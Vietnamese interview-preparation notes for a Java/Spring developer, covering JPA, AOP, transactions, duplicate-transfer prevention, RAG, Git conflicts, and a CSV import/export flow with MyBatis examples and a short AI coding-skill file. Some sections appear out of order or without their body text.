  • @Autowired: inject theo type; nếu có nhiều bean cùng type, Spring xét @Qualifier, @Primary hoặc tên field/parameter.
  • Constructor injection được khuyến nghị: dependency bắt buộc, dễ test, hỗ trợ immutable (final).
  • Field injection dễ viết nhưng khó test và che giấu dependency; setter injection phù hợp dependency tùy chọn.
@Service
public class StudentService {
  private final StudentRepository repo;

  public StudentService(StudentRepository repo) { // Spring inject
    this.repo = repo;
  }
}

26 Hibernate và JPA khác nhau thế nào? JPA
  • JPA là specification (Jakarta Persistence): định nghĩa annotation, EntityManager, JPQL, lifecycle, transaction. JPA không phải implementation.
  • Hibernate là một implementation phổ biến của JPA; cung cấp Session, HQL, caching, dirty checking, dialect.
  • Spring Data JPA là abstraction trên JPA, giúp viết repository interface, query derivation, pagination.
  • Entity lifecycle: transient → managed (persist) → detached → removed; thay đổi trên managed entity được dirty checking và flush khi transaction commit.
  • Cẩn thận: lazy loading ngoài transaction, N+1, cascade, orphanRemoval, flush mode.

Ví dụ N+1 với Hibernate: duyệt 100 thiết bị và in tên nhà máy — nếu quan hệ LAZY, Hibernate bắn 1 query lấy 100 thiết bị + 100 query lấy nhà máy = 101 query; sửa bằng fetch join:

for (Equipment e : repo.findAll()) {
  System.out.println(e.getFactory().getName()); // mỗi dòng 1 query
}

// Sửa: 1 query duy nhất
@Query("SELECT e FROM Equipment e JOIN FETCH e.factory WHERE e.status = :status")

27 AOP là gì? Ứng dụng trong Spring và liên hệ với @Transactional? Spring Core
  • AOP (Aspect-Oriented Programming): tách các mối quan tâm cắt ngang (logging, security, transaction, metrics) ra khỏi logic nghiệp vụ.
  • Khái niệm: aspect, pointcut (điều kiện khớp), advice (before/after/around), join point, weaving.
  • Spring AOP triển khai bằng proxy: interface → JDK dynamic proxy, class thường → CGLIB; chỉ áp dụng cho method public được gọi từ bean khác.
  • Ứng dụng: @Transactional, @Cacheable, @PreAuthorize, custom annotation logging.
Nhớ kỹ: @Transactional hoạt động qua proxy — self-invocation (gọi trong cùng class) hoặc method non-public sẽ không được áp dụng. Rollback mặc định chỉ với RuntimeException/Error; checked exception cần rollbackFor.

Ví dụ aspect tự viết: đo thời gian và log mọi method của service:

@Aspect
@Component
public class LoggingAspect {

  @Around("execution(* com.seixx.factory.service..*(..))")
  public Object logTime(ProceedingJoinPoint pjp) throws Throwable {
    long start = System.currentTimeMillis();
    try {
      return pjp.proceed();                       // chạy method gốc
    } finally {
      log.info("{} chạy {}ms", pjp.getSignature().toShortString(),
          System.currentTimeMillis() - start);
    }
  }
}
28 Quản lý transaction trong Java và @Transactional? Transaction

Transaction đảm bảo ACID. Trong Spring, có thể dùng programmatic (TransactionTemplate) hoặc declarative (@Transactional).

  • @Transactional thường đặt ở service, trên method public; Spring tạo proxy bao quanh để mở/commit/rollback transaction.
  • Propagation: REQUIRED (mặc định), REQUIRES_NEW, NESTED, SUPPORTS, NOT_SUPPORTED, MANDATORY, NEVER.
  • Isolation: READ_COMMITTED, REPEATABLE_READ, SERIALIZABLE... chọn theo yêu cầu nhất quán và hiệu năng.
  • Rollback: mặc định với RuntimeException và Error; checked exception không rollback trừ khi rollbackFor.
  • readOnly = true cho query; timeout để tránh transaction treo.
Self-invocation: gọi method @Transactional từ chính class đó không đi qua proxy → annotation không có tác dụng. Tách sang bean khác hoặc dùng AspectJ/TransactionTemplate.

Distributed transaction: 2PC/XA nặng và ít dùng; thực tế dùng Saga, outbox pattern, idempotency, eventual consistency.

Ví dụ SEIXX — import CSV phải all-or-nothing:

@Service
public class CsvImportService {

  @Transactional(rollbackFor = Exception.class)   // lỗi bất kỳ → rollback cả lô
  public ImportResult importEquipments(MultipartFile file) {
    List<CsvRow> rows = parser.parse(file);
    validator.validateAll(rows);        // ném CsvValidationException nếu có dòng sai
    repo.batchInsert(rows);             // ghi 10k dòng trong cùng transaction
    audit.log("IMPORT", rows.size());   // ghi audit chung transaction
    return new ImportResult(rows.size());
  }

  // Self-invocation: gọi importEquipments() từ method khác trong class này
  // sẽ KHÔNG mở transaction — phải gọi qua bean khác hoặc TransactionTemplate.
}
29 Khách hàng bấm chuyển tiền 2 lần, làm sao chặn? Banking

Phải chặn ở nhiều tầng; chỉ disable nút trên UI là không đủ vì request có thể bị gửi lại hoặc bị replay.

  • UI: disable nút sau click, debounce, hiển thị trạng thái đang xử lý; nhưng chỉ là lớp UX.
  • Idempotency key: client tạo requestId duy nhất cho mỗi lần chuyển; server lưu key và trả lại cùng kết quả nếu request lặp.
  • Redis: SET key value NX EX ttl để lock/đánh dấu request đang xử lý; dùng lock theo tài khoản/transaction, có timeout và giải phóng an toàn.
  • DB: unique constraint trên request_id/transaction_ref; transaction ACID; SELECT ... FOR UPDATE hoặc optimistic lock @Version; kiểm tra số dư trong transaction.
  • State machine: INIT → PROCESSING → SUCCESS/FAILED; không cho chuyển sang bước tiếp nếu trạng thái không hợp lệ.
  • Reconciliation: truy vấn theo requestId trả cùng kết quả; retry an toàn; đối soát cuối ngày.
Trả lời phỏng vấn: “Em sẽ dùng idempotency key + unique constraint ở DB, kết hợp Redis lock và transaction/row lock; UI chỉ hỗ trợ giảm thao tác, không phải lớp bảo vệ chính.”
-- Tầng DB chốt cuối: request_id unique — request thứ 2 vi phạm constraint
CREATE TABLE transfer (
  id           BIGSERIAL PRIMARY KEY,
  request_id   UUID NOT NULL,
  amount       NUMERIC(15,2) NOT NULL,
  status       VARCHAR(20) NOT NULL,
  CONSTRAINT uq_transfer_request UNIQUE (request_id)
);

-- Redis chống trùng sớm trước khi vào DB
SET transfer:req:{requestId} 1 NX EX 300   -- OK = chưa xử lý; nil = đang xử lý

-- Nếu muốn trả cùng kết quả cho request lặp (idempotent response):
SELECT status, amount FROM transfer WHERE request_id = :requestId;
-- có dòng → trả lại kết quả cũ, KHÔNG trừ tiền lần 2
30 Cơ chế auto-configuration trong Spring Boot hoạt động như thế nào? Spring

@SpringBootApplication = @SpringBootConfiguration + @ComponentScan + @EnableAutoConfiguration. Phần "auto" nằm ở @EnableAutoConfiguration.

  1. @EnableAutoConfiguration import AutoConfigurationImportSelector.
  2. Selector đọc danh sách cấu hình ứng viên từ classpath: Spring Boot 3 dùng file META-INF/spring/org.springframework.boot.autoconfigure.AutoConfiguration.imports (trước 2.7 là spring.factories).

  4. Điều kiện đúng → các @Bean bên trong mới được đăng ký vào context; sai → bỏ qua hoàn toàn, không lỗi.

12 So sánh == và === trong JavaScript? JavaScript
  • == (loose equality): so sánh sau khi ép kiểu (type coercion). Ví dụ '5' == 5 là true, null == undefined là true.
  • === (strict equality): so sánh cả giá trị và kiểu, không ép kiểu. '5' === 5 là false.

14 LCP là gì? Làm sao cải thiện? Performance

15 RAG là gì? Ứng dụng thế nào? AI

RAG (Retrieval-Augmented Generation) là kỹ thuật kết hợp truy xuất dữ liệu với LLM: tìm tài liệu liên quan trong knowledge base, đưa context đó vào prompt để model trả lời chính xác và cập nhật hơn.

  1. Chunk tài liệu → embedding → lưu vector DB.
  2. Nhận câu hỏi → embedding → tìm top-k chunk tương đồng.
  3. Ghép chunk vào prompt + câu hỏi → gọi LLM.
  4. Trả lời kèm nguồn; đánh giá retrieval và faithfulness.

Lợi ích: giảm hallucination, dùng dữ liệu nội bộ, cập nhật không cần train lại. Thách thức: chất lượng chunk/embedding, truy xuất sai, context quá dài, bảo mật dữ liệu.

Ứng dụng thực tế em dùng: tài liệu dự án SEIXX (spec, enum trạng thái, format file CSV của khách) được chunk theo mục rồi nhúng vào knowledge base — khi AI trả lời sai tên cột hay sai encoding, em đối chiếu lại với chunk gốc để sửa context thay vì “dạy lại” bằng prompt dài. Với câu hỏi kỹ thuật không có trong tài liệu nội bộ thì RAG trả “không tìm thấy” — tránh bịa.

16 Giải quyết conflict trong Git như thế nào? Git
  1. git pull --rebase hoặc merge nhánh mới nhất; Git báo file conflict.
  2. Mở file, tìm marker <<<<<<<, =======, >>>>>>>; hiểu thay đổi hai bên, giữ logic đúng (có thể kết hợp cả hai).
  3. Xóa marker, chạy build/test, kiểm tra lại.
  4. git add file đã giải quyết; git rebase --continue hoặc git commit.
  5. Nếu rối: git rebase --abort/git merge --abort và trao đổi với người cùng sửa.

Phòng tránh: pull thường xuyên, chia task nhỏ, commit sớm, tránh sửa cùng file lớn, thống nhất format code.

Ví dụ thực tế: hai người cùng sửa EquipmentMapper.xml — conflict trông như sau:

<<<<<<< HEAD (nhánh của mình)
  AND status = #{status}
=======
  AND e.status = #{status}   -- (nhánh bạn: đổi alias bảng)
>>>>>>> feature/equipment-alias

Không chọn thô một bên — hiểu ý cả hai: nhánh bạn đổi alias nên giữ e.status, phần của mình vẫn đúng logic. Sửa xong chạy test trước khi git add; nếu bí thì mở PR hỏi trực tiếp người cùng sửa thay vì đoán.

02 Bốc một chức năng bất kỳ trong dự án — trình bày flow (ví dụ màn hình search danh sách, import/export CSV)? Project

Cách trình bày: chọn một chức năng cụ thể, vẽ flow theo tầng, nói 1–2 điểm khó và kết quả. Ví dụ ở SEIXX: màn hình “Quản lý danh mục thiết bị” gồm search danh sách, import CSV và export CSV.

Bối cảnh: bảng equipment (equipment_code PK, name, factory_id, category_id, status, updated_at) là master cho các màn hình sản xuất; màn hình cho lọc theo mã/tên/nhà máy/trạng thái, import hàng loạt bằng CSV và export đúng dữ liệu đang xem.

1. Search danh sách

  • FE: form filter + phân trang → GET /api/equipments?code=&factoryId=&status=&page=0&size=20; giữ filter trên URL để chia sẻ link.
  • Controller: nhận DTO filter (không nhận SQL từ client); Service: trim, mặc định sắp xếp theo updated_at, giới hạn theo nhà máy của user.
  • MyBatis XML: SQL động theo điều kiện có/không:
<select id="searchEquipment" resultType="EquipmentDto">
  SELECT e.equipment_code, e.name, f.factory_name, e.status
  FROM equipment e
  JOIN factory f ON f.factory_id = e.factory_id
  WHERE e.deleted_flag = '0'
  <if test="code != null"> AND e.equipment_code LIKE #{code} || '%' </if>
  <if test="factoryId != null"> AND e.factory_id = #{factoryId} </if>
  ORDER BY e.updated_at DESC
  LIMIT #{size} OFFSET #{offset}
</select>

Index composite (factory_id, status) cho điều kiện lọc hay dùng; dữ liệu rất lớn thì chuyển dần sang keyset pagination.

2. Import CSV (batch, báo lỗi từng dòng)

  • FE gửi multipart/form-data (giới hạn size, chỉ nhận .csv) → Controller → Service.
  • Service đọc theo stream (không load cả file), validate từng dòng: đủ cột, đúng format ngày, factory_code phải tồn tại, mã thiết bị chưa trùng → gom lỗi kèm số dòng.
  • Hợp lệ hết thì ghi theo batch trong 1 transaction (batch ~500 dòng); có lỗi thì trả file kết quả để user sửa và import lại.
  • Điểm khó đã gặp: file từ khách Nhật có thể là Shift-JIS → phải detect encoding; mã kiểu 0012 bị Excel tự đổi định dạng khi mở lại file export.

3. Export CSV

  • Dùng đúng filter hiện tại: GET /api/equipments/export?... — export ra đúng những gì user đang thấy.
  • Ghi trực tiếp từng dòng ra response.getOutputStream() (streaming), không build list lớn trong RAM; set Content-Disposition: attachment; filename="equipments_YYYYMMDD.csv".
  • Header tiếng Nhật theo tài liệu DD; UTF-8 (kèm BOM nếu mở bằng Excel); ngày format yyyy/MM/dd.
Điểm ăn điểm: chốt bằng số liệu và câu chuyện thật (thay số của bạn vào) — “10.000 dòng import theo batch mất vài giây thay vì vài phút nếu insert từng dòng; dòng lỗi được báo đúng số để BA kiểm tra”. Nhắc thêm đã dùng skill import CSV để viết nhanh phần lặp lại và tự review nghiệp vụ.

Nội dung skill (rút gọn để show cho nhà tuyển dụng):

---
name: csv-import
description: Implement a safe, batch CSV import in a Spring Boot + MyBatis factory
  management project (SEIXX conventions).
---

# Khi nào dùng
Thêm hoặc sửa chức năng import CSV cho một màn hình (equipment, part, định mức...).

# Inputs
- Đối tượng + DDL (VD equipment: equipment_code PK, factory_id FK, status CHECK)
- File CSV mẫu (header theo DD, có thể Shift-JIS từ khách Nhật)
- Rule validate từng cột + mã master phải tồn tại (factory_code, category_code)
- Chiến lược lỗi: all-or-nothing | partial kèm báo cáo lỗi
- Endpoint + quyền theo nhà máy của user

# Workflow
1. Đọc convention hiện có: controller, service, mapper XML, DTO, exception handler.
2. Tạo DTO cho dòng CSV + DTO kết quả import {success, failed, errors[{line, reason}]}.
3. POST multipart/form-data: giới hạn size (VD 5MB), chỉ nhận .csv.
4. Detect encoding (UTF-8 / Shift-JIS), đọc theo stream (không load cả file),
   bỏ header, trim, validate từng dòng — gom lỗi kèm số dòng, không dừng ở lỗi đầu.
5. Kiểm tra master 1 lần, gom vào Set (tránh N+1), rồi mới validate từng dòng.
6. Check trùng: mã trùng trong file hoặc đã tồn tại trong DB.
7. Ghi batch insert/update qua MyBatis foreach (batch ~500) trong 1 @Transactional.
8. Trả summary + danh sách lỗi để FE hiển thị và user sửa, import lại.
9. Unit Test: file hợp lệ, thiếu cột, sai format ngày, trùng mã, file rỗng,
   encoding Shift-JIS, dòng quá dài.

# Rules
- Không nối chuỗi SQL — luôn bind param MyBatis (#{}).
- Không log PII/giá trị nhạy cảm; log line number + reason.
- @Transactional chỉ ở tầng service; rollback khi batch lỗi.
- Không insert từng dòng, không SELECT trong vòng lặp.
- Đo thời gian import 10.000 dòng và ghi lại để đối chiếu UTR.

# Done when
- Build + Unit Test pass.
- File lỗi trả đúng số dòng + lý do, import lại được.
- Query kiểm tra master dùng index (xem execution plan).
- Không còn TODO, không hard-code encoding/limit.
Khi phỏng vấn: đừng chỉ đọc skill — kể “trước và sau”: trước phải nhắc AI từng bước và hay sót rule; sau chỉ cần gọi skill rồi review. Nhấn mạnh em vẫn tự quyết định edge case, AI không tự chạy trên dữ liệu thật. Liên hệ: skill import CSV (mục AI) và flow import/export CSV.

  2. Bẻ task ≤ 1 ngày (0.5 ngày là đẹp) theo từng tầng: Controller → Service → Mapper/SQL → test → tài liệu.
  3. So với task tương tự đã làm (velocity thực tế): màn hình import trước mất 3 ngày thì màn hình tương tự cũng khoảng 2,5–3 ngày.
  4. Tính cả phần “không phải code”: đọc DD, viết UTC, chụp evidence/UTR, fix bug sau UTR — thường chiếm 40–50% thời gian.
  5. Cộng buffer 10–20% cho rủi ro (tích hợp, chờ review, dữ liệu thật bất ngờ).
  6. Trao đổi với TL và cam kết theo ngày; sau 1 ngày code thật nếu lệch thì báo sớm để điều chỉnh — không giấu đến deadline.

Ví dụ estimate task “màn hình import CSV thiết bị” — tổng 3 ngày:

0.5 ngày  Đọc DD + chốt rule validate + hỏi BA điểm mơ hồ
1.0 ngày  Coding: Controller + Service (parse/validate) + Mapper batch insert
0.5 ngày  Unit Test theo UTC (file hợp lệ, lỗi từng dòng, encoding)
0.5 ngày  UTR: chụp evidence, chạy free test, log bug Jira
0.5 ngày  Buffer: file thật của khách (Shift-JIS), fix review comment
----------------------------------------------------------------
3.0 ngày  Báo TL theo ngày; lệch > 20% sau ngày 1 thì cập nhật lại ngay
  • Nếu bị ép gấp: cắt scope có kiểm soát (VD chưa làm export riêng, chưa hỗ trợ Shift-JIS) và nói rõ phần cắt — không cắt Unit Test rồi nhận ẩu.
  • 1 ngày công tính khoảng 6 giờ làm việc thật (trừ họp/standup), không phải 8 giờ.

Chốt khi phỏng vấn: “Em estimate dựa trên task tương tự đã làm + bẻ nhỏ theo tầng + buffer, và luôn báo sớm khi lệch kế hoạch.”
